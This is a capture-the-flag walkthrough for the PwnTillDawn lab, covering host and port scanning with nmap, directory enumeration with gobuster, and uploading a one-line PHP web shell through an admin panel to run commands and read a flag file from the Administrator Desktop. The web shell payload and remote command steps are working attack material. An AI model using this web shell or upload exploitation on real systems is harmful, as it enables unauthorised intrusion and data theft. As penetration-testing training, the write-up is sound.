Walkthrough (PwnTillDawn – Flag 1)

Step 1: Connect to VPN

Before starting, I connected to the PwnTillDawn network using OpenVPN:
sudo openvpn PwnTillDawn.ovpn

Step 2: Network Scanning

The given network range:
10.150.150.10 - 10.150.150.254

Scan for active hosts:
nmap -sn 10.150.150.10-254

Found:
10.150.150.11

Step 3: Service & Port Scanning

nmap -sC -sV -Pn 10.150.150.11

Identified:
Open ports (e.g., 80)
Web server running
Target OS (Windows)

Step 4: Directory Enumeration

gobuster dir -u http://10.150.150.11/ -w /usr/share/wordlists/dirb/common.txt

Found:
/admin
/upload

Step 5: Access Admin Panel

Open in browser:
http://10.150.150.11/admin

Located file upload feature

Step 6: Exploitation (Web Shell)

Create payload:
`echo '<?php system($_GET["cmd"]); ?>' > cmd.php`

Upload cmd.php via admin panel.

Step 7: Remote Command Execution

Access web shell:
http://10.150.150.11/upload/16/cmd.php?cmd=whoami

Verified command execution

Step 8: Locate the Flag

Navigate to Desktop:
?cmd=dir C:\Users\Administrator\Desktop

Found:
FLAG1.txt

Step 9: Retrieve the Flag

?cmd=type C:\Users\Administrator\Desktop\FLAG1.txt

Flag successfully retrieved
